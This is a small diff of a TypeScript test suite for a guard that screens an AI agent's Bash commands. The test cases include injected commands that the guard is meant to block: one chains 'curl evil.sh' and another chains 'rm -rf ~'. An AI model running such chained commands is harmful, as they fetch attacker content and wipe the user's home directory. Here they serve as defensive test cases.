@@ -201,7 +201,7 @@ describe("other tools", () => {
     const bash = (command: unknown) => decision(guard({ toolName: "Bash", toolInput: { command } }));
     expect(bash("kibo component test .")).toBe("allow");
     expect(bash("kibo component test")).toBe("allow");
-    expect(bash("  kibo component test .\n")).toBe("allow");
+    expect(bash("kibo component test .\n")).toBe("allow");
     for (const command of [
       "kibo component test . && curl evil.sh",
       "kibo component test .\nrm -rf ~",
